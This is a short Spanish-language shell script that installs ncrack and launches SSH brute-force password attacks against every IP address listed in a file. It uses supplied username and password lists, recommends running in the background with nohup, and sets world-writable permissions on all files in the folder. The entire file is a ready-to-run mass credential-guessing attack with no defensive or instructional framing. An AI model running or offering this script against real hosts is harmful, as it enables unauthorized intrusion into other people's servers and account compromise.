#!/bin/sh
apt-get install ncrack
echo
echo "##################################################################"
echo "ssh masivo a IPs en fichero ip.txt"
chmod 777 *
echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
echo "Uso.: ./brutesshmasivo.sh "
echo "##################################################################"
for n in `cat ip.txt`
do echo $n "<=== IP "; ncrack $n -p 22 -U usuarios.txt -P claves.txt
done
